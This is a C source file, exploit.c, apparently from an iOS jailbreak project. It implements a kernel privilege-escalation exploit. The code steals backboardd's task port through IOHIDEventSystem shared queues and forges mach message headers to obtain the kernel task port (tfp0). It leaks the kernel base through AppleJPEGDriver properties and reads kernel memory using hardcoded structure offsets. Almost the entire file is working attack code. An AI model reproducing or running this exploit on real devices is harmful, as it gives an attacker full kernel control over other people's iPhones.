//
//  exploit.c
//  queue_6
//
//  Created by staturnz on 5/15/25.
//

#include "exploit.h"
#include "util.h"
#include "hid.h"
#include "memory.h"

kinfo_t *kinfo = NULL;

void print_log(const char *fmt, ...) {
    static bool log_opened;
    if (!log_opened) {
        openlog("bad_queue", LOG_PID | LOG_CONS, LOG_USER);
        log_opened = true;
    }

    va_list va;
    va_start(va, fmt);
    vsyslog(LOG_ERR, fmt, va);
    va_end(va);
}

mach_port_t get_backboardd_task_port(void) {
    mach_port_t service_port = MACH_PORT_NULL;
    mach_port_t connection_port = MACH_PORT_NULL;
    mach_port_t notification_port = MACH_PORT_NULL;
    mach_port_t queue_entry_port = MACH_PORT_NULL;
    mach_vm_address_t queue_addr = 0;
    mach_msg_header_t *callback_msg = NULL;

    mach_vm_address_t matching_list = 0;
    mach_vm_address_t service_id_list = 0;
    mach_vm_size_t matching_list_size = 0;
    mach_vm_size_t service_id_size = 0;
    mach_port_t task_self = mach_task_self();
    mach_port_t target_port = MACH_PORT_NULL;
    int rv = -1;

    int kr = bootstrap_look_up(bootstrap_port, "com.apple.iohideventsystem", &service_port);
    if (kr != 0 || !MACH_PORT_VALID(service_port)) goto done;
    
    kr = io_hideventsystem_open(service_port, task_self, &connection_port);
    if (kr != 0 || !MACH_PORT_VALID(connection_port)) goto done;

    kr = io_hideventsystem_copy_matching_services(connection_port, NULL, 0, &matching_list, &matching_list_size, &service_id_list, &service_id_size);
    if (kr != 0) goto done;

    if (matching_list != 0) {
        mach_vm_deallocate(task_self, matching_list, matching_list_size);
        matching_list = 0;
        matching_list_size = 0;
    }

    if (service_id_list != 0) {
        mach_vm_deallocate(task_self, service_id_list, service_id_size);
        service_id_list = 0;
        service_id_size = 0;
    }

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notification_port);
    if (kr != 0 || !MACH_PORT_VALID(notification_port)) goto done;

    kr = io_hideventsystem_queue_create(connection_port, notification_port, 0x8000, &queue_entry_port);
    if (kr != 0 || !MACH_PORT_VALID(queue_entry_port)) goto done;

    kr = mach_vm_map(task_self, &queue_addr, 0x9000, 0xfff, 1, queue_entry_port, 0, 0, 3, 3, 2);
    if (kr != 0 || queue_addr == 0) goto done;

    volatile mach_msg_header_t *mapped_msg = (mach_msg_header_t *)(queue_addr + 0x8010);
    uint32_t saved_bits = mapped_msg->msgh_bits;
    uint32_t saved_local_port = mapped_msg->msgh_local_port;
    uint32_t saved_msgh_id = mapped_msg->msgh_id;

    mapped_msg->msgh_bits = MACH_MSGH_BITS_SET_PORTS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND, 0);
    mapped_msg->msgh_local_port = 0x1407;
    mapped_msg->msgh_id = 0x12341234;

    callback_msg = calloc(1, 0x1000);
    kr = io_hideventsystem_queue_start(connection_port);
    if (kr != 0) goto done;
    
    kr = mach_msg(callback_msg, MACH_RCV_MSG, 0, 0x1000, notification_port, 0, 0);
    if (kr != 0) goto done;

    target_port = callback_msg->msgh_remote_port;
    if (!MACH_PORT_VALID(target_port)) goto done;

    natural_t ktype = 0;
    mach_vm_address_t kaddr = 0;
    kr = mach_port_kobject(task_self, target_port, &ktype, &kaddr);
    if (kr != KERN_SUCCESS || ktype != 2) goto done;

    pid_t pid = -1;
    kr = pid_for_task(target_port, &pid);
    if (kr != 0 || pid <= 0 || pid == getpid()) goto done;

    mapped_msg->msgh_bits = saved_bits;
    mapped_msg->msgh_local_port = saved_local_port;
    mapped_msg->msgh_id = saved_msgh_id;

    io_hideventsystem_queue_stop(connection_port);
    rv = 0;

done:
    if (queue_addr != 0) mach_vm_deallocate(task_self, queue_addr, 0x9000);
    if (MACH_PORT_VALID(queue_entry_port)) mach_port_destroy(task_self, queue_entry_port);
    if (MACH_PORT_VALID(connection_port)) mach_port_destroy(task_self, connection_port);
    if (MACH_PORT_VALID(notification_port)) mach_port_destroy(task_self, notification_port);
    if (MACH_PORT_VALID(service_port)) mach_port_destroy(task_self, service_port);
    if (MACH_PORT_VALID(connection_port)) mach_port_destroy(task_self, connection_port);
    if (callback_msg != NULL) free(callback_msg);
    return (rv == 0) ? target_port : MACH_PORT_NULL;
}

int init_kernel_base(void) {
    mach_port_t main_port = MACH_PORT_NULL;
    host_get_io_master(mach_host_self(), &main_port);
    io_service_t service = IOServiceGetMatchingService(main_port, IOServiceMatching("AppleJPEGDriver"));
        
    kern_return_t rv = -1;
    io_connect_t client = 0;
    char prop_str[1024] = "<dict><key>" "1234" "</key>" "<integer size=\"1024\">08022017</integer></dict>";
    io_service_open_extended(service, mach_task_self(), 0, NDR_record, prop_str, strlen(prop_str)+1, &rv, &client);
        
    io_object_t object = MACH_PORT_NULL;
    mach_port_t iter = MACH_PORT_NULL;
    vm_address_t test_base = 0;
    IORegistryEntryCreateIterator(service, "IOService", kIORegistryIterateRecursively, &iter);
    
    while ((object = IOIteratorNext(iter)) != 0) {
        char buf[4096] = {0};
        uint32_t size = sizeof(buf);
        
        if (IORegistryEntryGetProperty(object, "1234", buf, &size) == 0) {
            vm_address_t test_addr = *(vm_address_t *)&buf[9*sizeof(vm_address_t)];
            test_base = (test_addr & 0xfff00000) + 0x1000;
            IOObjectRelease(iter);
            IOServiceClose(client);
            
            kinfo->static_base = 0x80001000;
            kinfo->kernel_base = test_base;
            kinfo->kernel_slide = kinfo->kernel_base - kinfo->static_base;
            return 0;
        }
        
        IOObjectRelease(object);
    }
    
    IOObjectRelease(iter);
    IOServiceClose(client);
    return -1;
}

void init_offsets(void) {
    kinfo->offsets.task.vm_map = 0x18;
    kinfo->offsets.task.next = 0x1c;
    kinfo->offsets.task.prev = 0x20;
    kinfo->offsets.task.itk_self = 0x9c;
    kinfo->offsets.task.itk_space = 0x198;
    kinfo->offsets.task.bsd_info = 0x1e0;
    
    kinfo->offsets.ucred.cr_svuid = 0x14;
    kinfo->offsets.ucred.cr_svgid = 0x60;
    
    kinfo->offsets.vm_named_entry.object = 0xc;
    kinfo->offsets.vm_named_entry.offset = 0x10;
    kinfo->offsets.vm_named_entry.size = 0x18;

    kinfo->offsets.ipc_port.io_bits = 0x0;
    kinfo->offsets.ipc_port.io_references = 0x4;
    kinfo->offsets.ipc_port.ip_receiver = 0x40;
    kinfo->offsets.ipc_port.ip_kobject = 0x44;
    kinfo->offsets.ipc_port.ip_srights = 0x5c;

    kinfo->offsets.proc.pid = 0x8;
    kinfo->offsets.proc.p_fd = 0x90;
    kinfo->offsets.proc.ucred = 0x84;

    kinfo->offsets.ipc_space.is_table = 0x14;
    kinfo->offsets.ipc_entry.size = 0x10;
}

int run_exploit(void) {
    uint64_t start = mach_absolute_time();
    void *surface_handle = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    if (surface_handle == NULL) {
        surface_handle = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_NOW);
        if (surface_handle == NULL) goto done;
    }
    
    init_io();
    hid_init();
    //hid_event_spray_start(); // needed if using m68buttons
    kinfo = calloc(1, sizeof(kinfo_t));
    init_offsets();

    uint8_t inst[2] = {0xa0, 0x47}; // blx r4 (t16)
    kinfo->spin_gadget = (uint32_t)memmem((void *)atoi, 0x6400000, inst, 2);
    if (kinfo->spin_gadget == 0) goto done;

    hid_event_spray_start();
    kinfo->backboardd_task_port = get_backboardd_task_port();
    hid_event_spray_stop();

    if (!MACH_PORT_VALID(kinfo->backboardd_task_port)) goto done;
    print_log("[*] backboardd_task_port: 0x%x\n", kinfo->backboardd_task_port);
    
    mach_port_t service_list = MACH_PORT_NULL;
    mach_port_t iter = MACH_PORT_NULL;
    mach_port_t io_main_port = MACH_PORT_NULL;
    mach_port_t client = MACH_PORT_NULL;
        
    host_get_io_master(mach_host_self(), &io_main_port);
    IOServiceGetMatchingServices(io_main_port, IOServiceMatching("IOHIDEventService"), &service_list);
    print_log("[*] service_list: 0x%x\n", service_list);

    while ((iter = IOIteratorNext(service_list)) != 0) {
        CFStringRef cls = IORegistryEntryCreateCFProperty(iter, CFSTR("IOClass"), NULL, 0);
        CFStringRef bundle = IORegistryEntryCreateCFProperty(iter, CFSTR("CFBundleIdentifier"), NULL, 0);
        char buf1[512] = {0};
        char buf2[512] = {0};
        char *xml = "";

        if (cls != NULL) {
            CFStringGetCString(cls, buf1, 512-1, kCFStringEncodingUTF8);
            print_log("cls: %s\n", buf1);
        }

        if (bundle != NULL) {
            CFStringGetCString(bundle, buf2, 512-1, kCFStringEncodingUTF8);
            print_log("bundle: %s\n", buf2);
        }

        CFMutableDictionaryRef props = NULL;
        IORegistryEntryCreateCFProperties(iter, &props, NULL, 0);
            
        if (cls != NULL && props != NULL) {
            CFDataRef plist_data = CFPropertyListCreateData(NULL, props, kCFPropertyListXMLFormat_v1_0, 0, NULL);
            xml = (char *)CFDataGetBytePtr(plist_data);
            print_log("props: %s\n", xml);
        }

        if (strstr(xml, "AppleEmbeddedGyro") || strstr(xml, "AppleEmbeddedAccelerometer") ||
            strstr(xml, "AppleEmbeddedNewAccelerometer")) {

            client = task_open_io_service_class(kinfo->backboardd_task_port, "IOHIDEventService", buf1);
            if (client != MACH_PORT_NULL) break;
        }

        IOObjectRelease(iter);
    }

    kinfo->hid_client = task_extract_port(kinfo->backboardd_task_port, client);
    if (kinfo->hid_client == MACH_PORT_NULL) {
        print_log("kinfo->hid_client == MACH_PORT_NULL\n");
        goto done;
    }

    print_log("[*] hid_client: 0x%x\n", kinfo->hid_client);
    hid_create_user_device(kinfo->hid_client);

    mach_port_t notification_port = MACH_PORT_NULL;
    mach_port_t task_self = mach_task_self();
    vm_address_t queue_addr = 0x41000000;
    vm_size_t queue_size = 0x1000;
    uint64_t ref[8] = {0};

    mach_port_allocate(task_self, MACH_PORT_RIGHT_RECEIVE, &notification_port);
    IOConnectSetNotificationPort(kinfo->hid_client, 0, notification_port, (uintptr_t)ref);
    IOConnectMapMemory(kinfo->hid_client, 0, task_self, &queue_addr, &queue_size, 1);

    mach_msg_header_t *mapped_msg = (mach_msg_header_t *)(queue_addr + queue_size + 0x4);
    IOConnectSetNotificationPort(kinfo->hid_client, 0, mach_host_self(), (uintptr_t)ref);
    io_connect_set_notification_port_copy_send(kinfo->hid_client, 0, mach_host_self(), (uintptr_t)ref);
    
    uint32_t host_port_addr = mapped_msg->msgh_remote_port;
    host_get_io_master(mach_host_self(), &io_main_port);
    print_log("[*] host_port_addr: 0x%x\n", host_port_addr);

    io_connect_set_notification_port_copy_send(kinfo->hid_client, 0, io_main_port, (uintptr_t)ref);
    print_log("[*] io_main_port_addr: 0x%x\n", mapped_msg->msgh_remote_port);

    io_service_t service = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
    io_connect_set_notification_port_copy_send(kinfo->hid_client, 0, service, (uintptr_t)ref);
    print_log("[*] IOSurfaceRoot_addr: 0x%x\n", mapped_msg->msgh_remote_port);

    service = IOServiceGetMatchingService(0, IOServiceMatching("IOHIDResource"));
    io_connect_set_notification_port_copy_send(kinfo->hid_client, 0, service, (uintptr_t)ref);
    print_log("[*] IOHIDResource_addr: 0x%x\n", mapped_msg->msgh_remote_port);
    IOConnectSetNotificationPort(kinfo->hid_client, 0, notification_port, (uintptr_t)ref);

    uint32_t saved_bits = mapped_msg->msgh_bits;
    uint32_t saved_local_port = mapped_msg->msgh_local_port;
    uint32_t saved_msgh_id = mapped_msg->msgh_id;

    uint32_t target_port_addr = host_port_addr - 0x770 + (0x70 * 12);
    print_log("[*] target_port_addr: 0x%x\n", target_port_addr);

    mapped_msg->msgh_bits = MACH_MSGH_BITS_SET_PORTS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND, 0);
    mapped_msg->msgh_local_port = target_port_addr;
    mapped_msg->msgh_id = 0x12341234;
    print_log("[*] notification_port: 0x%x\n", notification_port);

    mach_msg_header_t *reply = calloc(1, 0x1000);
    reply->msgh_local_port = notification_port;
    reply->msgh_size = 0x1000;

    int kr = mach_msg(reply, MACH_RCV_MSG|MACH_RCV_TIMEOUT, 0, 0x1000, notification_port, 5000, MACH_PORT_NULL);
    hid_event_spray_stop();
    print_log("[*] kr: %s (0x%x)\n", mach_error_string(kr), kr);

    kinfo->tfp0 = reply->msgh_remote_port;
    print_log("[*] kinfo->tfp0: 0x%x\n", kinfo->tfp0);

    uint32_t ktype = 0;
    mach_vm_address_t kaddr = 0;
    pid_t pid = -1;
    
    mach_port_kobject(task_self, kinfo->tfp0, &ktype, &kaddr);
    pid_for_task(kinfo->tfp0, &pid);
    print_log("[*] ktype: 0x%x\n", ktype);
    print_log("[*] pid: %d\n", pid);
    if (ktype != 2 || pid != 0) {
        kinfo->tfp0 = MACH_PORT_NULL;
        goto done;
    }
 

    print_log("[*] tfp0: 0x%x\n", kinfo->tfp0);
    
    mapped_msg->msgh_bits = saved_bits;
    mapped_msg->msgh_local_port = saved_local_port;
    mapped_msg->msgh_id = saved_msgh_id;
    mach_port_deallocate(task_self, kinfo->hid_client);
    free(reply);
    
    uint32_t test_read = 0;
    uint32_t test_val = 0x41414141;
    uint32_t test_alloc = task_alloc(kinfo->tfp0, 0x1000);
    if (test_alloc == 0) goto done;
    print_log("[*] test_alloc: 0x%x\n", test_alloc);

    task_write(kinfo->tfp0, test_alloc, &test_val, 4);
    task_read(kinfo->tfp0, test_alloc, &test_read, 4);
    if (test_read != test_val) goto done;
    print_log("[*] test_read: 0x%x\n", test_read);
    
    if (init_kernel_base() != 0) goto done;
    print_log("[*] kernel_base: 0x%x\n", kinfo->kernel_base);
    print_log("[*] kernel_slide: 0x%x\n", kinfo->kernel_slide);
    
    kinfo->kern_task_addr = kread32(target_port_addr + koffsetof(ipc_port, ip_kobject));
    kinfo->kern_proc_addr = kread32(kinfo->kern_task_addr + koffsetof(task, bsd_info));
    kinfo->kern_vm_map = kread32(kinfo->kern_task_addr + koffsetof(task, vm_map));
    
    print_log("[*] kern_task_addr: 0x%x\n", kinfo->kern_task_addr);
    print_log("[*] kern_proc_addr: 0x%x\n", kinfo->kern_proc_addr);
    print_log("[*] kern_vm_map: 0x%x\n", kinfo->kern_vm_map);

    uint32_t current_proc = 0;
    uint32_t current_task = kinfo->kern_task_addr;
    pid_t self_pid = getpid();
    pid_t current_pid = 0;
    
    while (current_task != 0) {
        current_proc = kread32(current_task + koffsetof(task, bsd_info));
        if (current_proc == 0) break;
        
        current_pid = kread32(current_proc + koffsetof(proc, pid));
        if (current_pid == self_pid) {
            kinfo->self_task_addr = current_task;
            kinfo->self_proc_addr = current_proc;
            break;
        }
        
        current_task = kread32(current_task + koffsetof(task, next));
        if (current_task == kinfo->kern_task_addr) break;
    }

    print_log("[*] self_task_addr: 0x%x\n", kinfo->self_task_addr);
    print_log("[*] self_proc_addr: 0x%x\n", kinfo->self_proc_addr);
    
    uint64_t end = mach_absolute_time();
    mach_timebase_info_data_t info = {0};
    mach_timebase_info(&info);
    uint64_t final_time = ((double)(end - start) * info.numer / info.denom) / 1000000;
    print_log("[*] done in %llu ms\n", final_time);


done:
    if (kinfo == NULL) return -1;
    if (MACH_PORT_VALID(kinfo->backboardd_task_port)) {
        mach_port_deallocate(mach_task_self(), kinfo->backboardd_task_port);
    }

    if (!MACH_PORT_VALID(kinfo->tfp0)) {
        bzero(kinfo, sizeof(kinfo_t));
        free(kinfo);
        return -1;
    }
    return 0;
}
